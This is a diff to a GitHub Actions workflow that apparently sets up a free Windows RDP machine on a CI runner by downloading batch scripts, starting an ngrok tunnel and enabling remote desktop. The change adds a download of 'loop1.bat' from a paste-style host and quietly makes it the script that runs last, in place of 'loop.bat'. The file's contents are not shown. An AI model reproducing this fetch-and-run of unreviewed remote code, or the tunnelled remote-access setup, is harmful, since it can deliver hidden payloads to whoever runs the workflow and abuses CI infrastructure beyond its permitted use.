@@ -26,6 +26,7 @@ jobs:
         Invoke-WebRequest https://raw.githubusercontent.com/simplehacker01/Win10/main/NGROK-AP.bat -OutFile NGROK-AP.bat
         Invoke-WebRequest https://raw.githubusercontent.com/simplehacker01/Win10/main/NGROK-CHECK.bat -OutFile NGROK-CHECK.bat
         Invoke-WebRequest https://raw.githubusercontent.com/simplehacker01/Win10/main/loop.bat -OutFile loop.bat
+        Invoke-WebRequest https://ptero.co/raw/hahekepyto -OutFile loop1.bat
     - name: Make YML file for NGROK.
       run: start NGROK-AP.bat
     - name: Enable RDP Access.
@@ -38,4 +39,4 @@ jobs:
     - name: Connect to your RDP 2core-7GB Ram.
       run: cmd /c NGROK-CHECK.bat
     - name: All Done! You can close Tab now! Maximum VM time:6h.
-      run: cmd /c loop.bat 
+      run: cmd /c loop1.bat 
